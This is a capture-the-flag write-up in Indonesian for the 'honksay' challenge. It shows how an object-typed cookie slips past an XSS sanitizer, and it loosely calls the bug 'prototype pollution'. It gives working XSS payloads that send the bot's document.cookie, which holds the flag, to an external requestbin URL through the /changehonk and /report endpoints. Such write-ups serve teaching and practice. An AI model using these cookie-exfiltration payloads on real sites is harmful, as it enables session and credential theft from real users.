# honksay
XSS + JS prototype polution
Pertama pelu kita ketahui, bahwa bot menyimpan flag.
bisa kita lihat di goose.js

```js
...snip...
const FLAG = process.env.FLAG || "maple{fake}";
...snip...
        await page.setCookie({
            name: 'flag',
            value: FLAG,
            domain: 'localhost',
            samesite: 'none'
        });
```

Ada sesuatu yang menarik mata app.js, dimana jika typeof dari honk merupakan objek maka tidak akan di parse oleh funcsi clean (fungsi yang ngeparse xss, xss module).

```js
...snip...
        if (typeof (req.cookies.honk) === 'object') {
            finalhonk = req.cookies.honk
        } else {
            finalhonk = {
                message: clean(req.cookies.honk),
                amountoftimeshonked: req.cookies.honkcount.toString()
            };
        }
...snip...
```

Bisa kita lihat lagi di app.js-nya, disitu ada  get request yang mengarah ke /changehonk . Yes, disini merupakan entrance, dari xss nya. Tapi wait, dia hanya bisa mengubah cookie honk saja, benarkah???

```js
...snip...
app.get('/changehonk', (req, res) => {
    res.cookie('honk', req.query.newhonk, {
        httpOnly: true
    });
    res.cookie('honkcount', 0, {
        httpOnly: true
    });
    res.redirect('/');
});
...snip...
```

Disini JS prototype polution mengambil peran, dimana kita bisa mengubahnya menjadi objek dengan menginputkan get request ke /changehonk, dan mengambil alih output yang akan di keluarkan message dan amountoftimeshonked.

```js
...snip...
app.get('/', (req, res) => {
    if (req.cookies.honk) {
        //construct object
        let finalhonk = {};
        fs.appendFileSync("./log.txt", "\ntypeof: " + typeof (req.cookies.honk + "\n")) // debug
        if (typeof (req.cookies.honk) === 'object') {
            finalhonk = req.cookies.honk
        } else {
            finalhonk = {
                message: clean(req.cookies.honk),
                amountoftimeshonked: req.cookies.honkcount.toString()
            };
        }
        res.send(template(finalhonk.message, finalhonk.amountoftimeshonked));
    }
...snip...
```

```
Payload
get request to:
http://localhost:9988/changehonk
parameter 1:
newhonk[message]=asdasd
parameter 2:
newhonk[amountoftimeshonked]=<script>fetch("https://requestbin.io/1ejfgqq1?c=" + document.cookie);</script>
```

Bisa dilihat di atas, karna flag memiliki domain localhost maka kita hanya bisa mendapatkan flag dari domain localhost. Kita bisa mendapatkan informas port dari Dockerfile-nya
```Dockerfile
# Expose port
EXPOSE 9988
```

```
Final payload:
http://localhost:9988/changehonk?newhonk[message]=asdasd&newhonk[amountoftimeshonked]=%3Cscript%3Edocument%2Elocation%3D%22https%3A%2F%2Frequestbin%2Eio%2F1ejfgqq1%3Fc%3D%22%20%2B%20document%2Ecookie%3B%3C%2Fscript%3E
```


Tinggal kita post saja payloadnya ke /report yang ada di main page, dan kita akan mendapatkan flagnya di webhook kita (disini saya menggunakan requestbin).